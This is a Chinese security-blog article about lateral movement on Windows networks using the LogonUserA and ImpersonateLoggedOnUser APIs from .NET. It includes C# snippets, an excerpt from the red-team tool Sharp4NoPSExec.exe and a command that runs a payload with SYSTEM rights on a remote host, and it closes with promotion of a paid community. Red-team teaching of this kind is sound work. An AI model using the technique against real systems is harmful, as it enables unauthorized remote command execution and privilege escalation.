---
title: .NET 内网横向移动，通过模拟用户令牌实现远程权限提升
url: https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247498252&idx=1&sn=cf0ab90b357c9de769fa264d92b5d3db&chksm=fa5954e1cd2eddf79d8bdfb7da7b322787b306361d64639876956062b76e3e3e827960b2bbb5&scene=58&subscene=0#rd
source: dotNet安全矩阵
date: 2025-01-17
fetch_date: 2025-10-06T20:10:54.542703
---

# .NET 内网横向移动，通过模拟用户令牌实现远程权限提升

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y81ssibGribdYSOgqyk7F9eL2icGH8KWGRWVqjH1pWS76otuYkhjPxznfqHejITaQxaiaFHqfPHbPS80g/0?wx_fmt=jpeg)

# .NET 内网横向移动，通过模拟用户令牌实现远程权限提升

原创

专攻.NET安全的

dotNet安全矩阵

![](https://mmbiz.qpic.cn/mmbiz_gif/NO8Q9ApS1YibJO9SDRBvE01T4A1oYJXlTBTMvb7KbAf7z9hY3VQUeayWI61XqQ0ricUQ8G1FykKHBNwCqpV792qg/640?wx_fmt=gif&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1)

LogonUserA 和 ImpersonateLoggedOnUser 是强大的 Windows API，允许程序以指定用户的身份操作。攻击者利用这些函数可模拟合法用户权限，用于横向移动或访问敏感资源。

Sharp4NoPSExec.exe 便是一款利用 Windows API 提供的用户令牌登录与模拟功能，通过提供有效的凭据，在目标主机上执行指定的命令的红队工具。

**01. 验证用户凭据**

Windows API 中 LogonUserA 函数用于验证用户的凭据，包含用户名、密码、域，并创建一个新的用户令牌 Token。该令牌可用于模拟用户权限或在当前进程中执行该用户上下文的操作，函数签名如下所示。

```
```
BOOL LogonUserA(
    LPCSTR lpszUsername,   // 用户名
    LPCSTR lpszDomain,     // 域名
    LPCSTR lpszPassword,   // 密码
    DWORD dwLogonType,     // 登录类型
    DWORD dwLogonProvider, // 登录提供程序
    PHANDLE phToken        // 返回的用户令牌
);
```
```

dwLogonType参数的值，LOGON32\_LOGON\_INTERACTIVE 表示交互式登录。最终函数返回的 phToken 是用于后续用户模拟操作的关键句柄。

在 .NET 中使用 DllImport 特性将其从 advapi32.dll 动态链接库导入调用的方法如下所示。

```
```
[DllImport("advapi32.dll")]
public static extern bool LogonUserA(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);
```
```

`LogonUserA 是一个强大的 API，结合 ImpersonateLoggedOnUser 可以模拟目标用户的权限完整的控制台程序调用代码代码可参考如下。`

```
```
using System;
using System.Runtime.InteropServices;

class Program
{
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool LogonUserA(
        string lpszUsername,
        string lpszDomain,
        string lpszPassword,
        int dwLogonType,
        int dwLogonProvider,
        ref IntPtr phToken);

    static void Main(string[] args)
    {
        IntPtr tokenHandle = IntPtr.Zero;

        // 示例用户名、密码、域名
        string username = "testuser";
        string password = "P@ssw0rd!";
        string domain = "TESTDOMAIN";

        // 调用 LogonUserA
        bool isSuccess = LogonUserA(username, domain, password, 9, 0, ref tokenHandle);

        if (isSuccess)
        {
            Console.WriteLine("LogonUserA 成功。用户令牌句柄: " + tokenHandle);
        }
        else
        {
            int errorCode = Marshal.GetLastWin32Error();
            Console.WriteLine("LogonUserA 失败。错误代码: " + errorCode);
        }
    }
}
```
```

成功调用后，tokenHandle 包含用户的访问令牌，用于后续操作如模拟用户、访问受限资源等。

**02. 线程模拟权限**

Windows API 中 ImpersonateLoggedOnUser 函数接收一个用户令牌，由LogonUserA返回，让调用线程模拟该用户的权限，函数签名如下所示。

```
```
BOOL ImpersonateLoggedOnUser(
    HANDLE hToken   // 用户令牌
);
```
```

调用线程可以在此模拟上下文中操作系统资源，直到调用 RevertToSelf 结束模拟，通常用于让进程或线程以指定用户的身份执行某些操作，例如访问受限的网络资源或文件系统。

在 .NET 中使用 DllImport 特性将其从 advapi32.dll 动态链接库导入调用的方法如下所示。

```
```
[DllImport("advapi32.dll", SetLastError = true)]
private static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
```
```

参数hToken表示用户访问令牌的句柄，该句柄由 LogonUser 或类似函数，返回 true，表示当前线程已成功模拟目标用户。

**03. 工具实现和操作**

Sharp4NoPSExec.exe 便是这样一款红队工具，利用 Windows API 提供的用户令牌登录与模拟功能在目标主机上执行指定的命令或程序，部分代码如下所示。

```
```
if (!string.IsNullOrEmpty(options.username) && !string.IsNullOrEmpty(options.password))
{
    IntPtr phToken = IntPtr.Zero;
    bool result = LogonUserA(options.username, options.domain, options.password, 9, 0, ref phToken);
    if (!result)
    {
        Console.WriteLine("[!] LogonUser failed. Error: {0}", new Win32Exception(Marshal.GetLastWin32Error()).Message);
        return;
    }
    result = ImpersonateLoggedOnUser(phToken);
    if (!result)
    {
        Console.WriteLine("[!] ImpersonateLoggedOnUser failed. Error: {0}", new Win32Exception(Marshal.GetLastWin32Error()).Message);
        return;
    }
```
```

上述代码，利用凭据调用 LogonUserA 登录目标用户，获取令牌，调用 ImpersonateLoggedOnUser 模拟目标用户，使用模拟上下文执行网络操作或本地操作。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y81ssibGribdYSOgqyk7F9eL2l7LAicZ6WUAfVEpeXQ9iazPTujnh5xCHeXGm1f4IWX38QBkhLF4Gh23A/640?wx_fmt=jpeg&from=appmsg)

## 3.1 工具基本用法

比如，启动目标主机上具有 SYSTEM 权限的记事本，具体命令如下所示。

```
```
Sharp4NoPSExec.exe --target=192.168.101.86 --payload="c:\windows\system32\cmd.exe /c notepad"
```
```

此命令将在目标主机上以高权限运行记事本程序，如下图所示。

![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y81ssibGribdYSOgqyk7F9eL2xtH4hPC2lkNiaMEDCtzJTe4vQ2ETRhlJSibPYsUsGzh5iafG59cgDAncw/640?wx_fmt=png&from=appmsg)

综上，Sharp4NoPSExec.exe 是一款高效的横向移动工具，凭借其对 API 的调用，实现了高权限命令执行，文章涉及的工具已打包在星球，感兴趣的朋友可以加入自取。

**04. 技术精华内容**

从漏洞分析到安全攻防，我们涵盖了 .NET 安全各个关键方面，为您呈现最新、最全面的 .NET 安全知识，下面是公众号发布的精华文章集合，推荐大伙阅读！

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8TQhCZMggf71ffibqISJ8f5naPJacnjn0roDyxxnAibmuwDJq2p1GTBpicZhnM9o9gTIu9S9ia8Uqwtw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&retryload=1&tp=webp)](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247497498&idx=2&sn=00900a0c29c85b41fe6a586d7e5c3571&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9tl26Kh2sQYI9guTCflSwQP8Gs9z7iamicOvlQv4UYzjwd378D03h7yEYFtZ6xA74qicInoed7qpBWg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247495167&idx=1&sn=9280c55fdc7c9146e549be470cf9f120&chksm=fa594312cd2eca04bfe8fd1fd3890b389d9c700b9b69d897f919addac399bab4f4d2e55f6b4f&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOeP3ichLEiafhGiawd8mjkHYBalO37fN8QQkNdic1hjjY2Nvw2Bib6UvibDRA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOjWgak8cI7Mic1wTt3YSKqsbLl9rPe0cF9WGtOEuiceLreTNtNVib6IKlw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxO8jJ97qqWlY6XR03DqSnutcHFYibDtVG5Y2wEaK4p2bzEicZblY4oQyGg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1YibQ6VpnKYXPqfmHnyJHzHxOe1viaia4aoFceunsUdIna4DPbmemW1EqlBMrovOoE6bdAFF3iaApxz5qA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)

**05. 加入安全社区**

目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最专业的技术知识库之一，超 **1200+** 成员一起互动学习。星球主题数量近 **600+**，精华主题 230+，PDF文档和压缩包 300+ 。从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的实战指南和最佳实践。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9AiaXibTRdEnEfYuQx76FjZVjmyEWtIaDuDePFFmyRqggiaq2k47pLoib9GZtUCOhaP40WPlhvbiaKZVg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

## 5.1 20+专栏文章

星球文化始终认为授人以鱼不如授人以渔！星球整理出**20+**个专题栏目涵盖 **.NET安全 点、线、面、体等知识范围**，助力师傅们实战攻防！其中主题包括.NET  内网攻防、漏洞分析、内存马、代码审计、预编译、反序列化、WebShell免杀、命令执行、工具库等等。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopa90SJRuwnLy9uZV4icrXiaZlJPQlYJWXTw8HCrF9oTcE3DDgrdFnXo2BA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

## 5.2 海量资源和工具

截至当前，dot.Net安全矩阵星球社区汇聚了 **600+** 个实用工具和高质量PDF学习资料。这些资源涵盖了攻防对抗的各个方面，在实战中能够发挥显著作用，为对抗突破提供强有力的支持。

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopaqVZW8XsALVA4FNiaj32q8npN82VSeqSKb4fQvLiczFNs0099VRFVQwPA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopa63ZXbX3YXLwoeNnjStcRtTbU9hoe6ecO5hhkj2apG1I6tKlkpz5GaQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

## 5.3 专属成员交流群

我们还有多个成...